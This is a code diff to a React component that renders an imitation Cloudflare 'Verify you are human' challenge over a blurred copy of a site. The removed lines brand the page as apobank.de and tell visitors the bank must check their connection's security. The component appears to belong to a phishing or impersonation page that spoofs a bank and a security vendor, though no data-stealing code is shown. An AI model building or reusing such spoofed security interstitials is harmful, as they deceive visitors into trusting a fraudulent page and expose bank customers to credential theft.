@@ -106,55 +106,41 @@ const CfCaptcha = () => {
         <div aria-hidden className="fixed inset-0 z-0 overflow-hidden pointer-events-none blur-md scale-105 select-none">
           <Index />
         </div>
-        <div className="fixed inset-0 z-50 bg-white/95 flex items-start justify-start px-6 sm:px-16 py-10 sm:py-16 overflow-auto">
-          <div className="w-full max-w-[640px]">
-            <h1 className="text-[22px] sm:text-[24px] font-semibold text-[#0f172a]">apobank.de</h1>
-            <h2 className="mt-3 text-[18px] sm:text-[20px] font-semibold text-[#0f172a]">
-              Checking if the site connection is secure
-            </h2>
-
-            <div className="mt-6 flex items-center justify-between gap-4 rounded-md border border-slate-200 bg-[#f7f8fa] px-5 py-4 max-w-[440px]">
-              <div className="flex items-center gap-3">
-                {phase === "idle" && (
-                  <>
-                    <button
-                      onClick={onCheck}
-                      aria-label="Verify you are human"
-                      className="h-6 w-6 rounded-sm border border-slate-400 bg-white hover:border-slate-600 transition"
-                    />
-                    <span className="text-[15px] text-[#0f172a]">Verify you are human</span>
-                  </>
-                )}
-                {phase === "verifying" && (
-                  <>
-                    <div className="h-6 w-6 rounded-full border-2 border-slate-300 border-t-[#f38020] animate-spin" />
-                    <span className="text-[15px] text-[#0f172a]">Verifying...</span>
-                  </>
-                )}
-                {phase === "success" && (
-                  <>
-                    <div className="h-6 w-6 rounded-full bg-[#2e7d32] flex items-center justify-center">
-                      <Check className="h-4 w-4 text-white" strokeWidth={3} />
-                    </div>
-                    <span className="text-[15px] text-[#0f172a]">Success!</span>
-                  </>
-                )}
-              </div>
-              <CfBrand />
+        <div className="fixed inset-0 z-50 bg-white/95 flex items-center justify-center px-4">
+          <div className="flex items-center justify-between gap-4 rounded-md border border-slate-200 bg-[#f7f8fa] px-5 py-4 w-full max-w-[440px] shadow-sm">
+            <div className="flex items-center gap-3">
+              {phase === "idle" && (
+                <>
+                  <button
+                    onClick={onCheck}
+                    aria-label="Verify you are human"
+                    className="h-6 w-6 rounded-sm border border-slate-400 bg-white hover:border-slate-600 transition"
+                  />
+                  <span className="text-[15px] text-[#0f172a]">Verify you are human</span>
+                </>
+              )}
+              {phase === "verifying" && (
+                <>
+                  <div className="h-6 w-6 rounded-full border-2 border-slate-300 border-t-[#f38020] animate-spin" />
+                  <span className="text-[15px] text-[#0f172a]">Verifying...</span>
+                </>
+              )}
+              {phase === "success" && (
+                <>
+                  <div className="h-6 w-6 rounded-full bg-[#2e7d32] flex items-center justify-center">
+                    <Check className="h-4 w-4 text-white" strokeWidth={3} />
+                  </div>
+                  <span className="text-[15px] text-[#0f172a]">Success!</span>
+                </>
+              )}
             </div>
-
-            <p className="mt-6 text-[14px] text-[#0f172a] max-w-[560px]">
-              apobank.de needs to review the security of your connection before proceeding.
-            </p>
-
-            <div className="mt-6 border-l-2 border-slate-300 pl-3">
-              <button className="text-[14px] text-[#0f172a] font-medium">Why am I seeing this page? ⌄</button>
-            </div>
+            <CfBrand />
           </div>
         </div>
       </div>
     );
   }
+
 
   return (
     <div className="relative min-h-screen overflow-hidden bg-[#f5f7fa]">
